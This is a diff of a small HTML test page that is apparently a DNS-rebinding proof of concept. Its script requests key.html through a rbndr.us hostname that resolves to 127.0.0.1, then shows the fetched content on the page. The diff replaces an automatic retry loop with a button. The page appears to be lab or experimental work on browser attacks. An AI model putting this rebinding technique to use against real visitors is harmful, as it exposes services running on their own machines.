@@ -1,47 +1,42 @@
 <html>
 	<head>
-		Bait
+		<title>Bait page</title>
 	</head>
 	<body>
 		
-	<div> This is a wannabe malicious-y test page running a script. </div>
-	<p id="reply"></p>
-
+	<div> <h1>This is a wannabe malicious-y test page</h1><p>...not so quietly running a script.</p></div>
 	<script>
-		var xhttp = new XMLHttpRequest();
 		function load() {
+			var xhttp = new XMLHttpRequest();
 			var foundIt = false;
 			var response = "";
-			var breakSwitch = 0;
-
-			while(foundIt != true && breakSwitch < 2000){
-					breakSwitch ++;
-
+			//var breakSwitch = 0;
+			//while(foundIt != true && breakSwitch < 2000){
+			//		breakSwitch ++;
 					xhttp.onreadystatechange = function() {
 							if (this.readyState == 4 && this.status == 200) {
 									console.log("here");
 									var response = this.responseText;
 									substring = "key";
 									if(response.indexOf(substring) !== -1){
-											document.getElementById("reply").innerHTML = response;
+											document.getElementById("display_result").innerHTML = response;
 											foundIt=true;
 											console.log("Found key!");
-									}else{
-											console.log("Key not found, retrying....");
-									}
+									}//else{
+									//		console.log("Key not found, retrying....");
+									//}
 							}
 					};
-
 					xhttp.open("GET", "http://a48a1f96.7f000001.rbndr.us/key.html", true);
 					//xhttp.open("GET", "http://127.0.0.1/key.html", true);
 					xhttp.setRequestHeader("Content-type", "text/plain");
 					console.log("Sending request!");
 			  		xhttp.send();
-			}
+			//}
 		}
-
-		load();
+		//load();
 	</script>
-	
+	<button style="background-color: silver" onclick="load()">Reload!</button>
+	<div id="display_result" style="width: 400px; height: 100px; border-width: 2px; border-color: black"></div>	
 </body>
 </html>
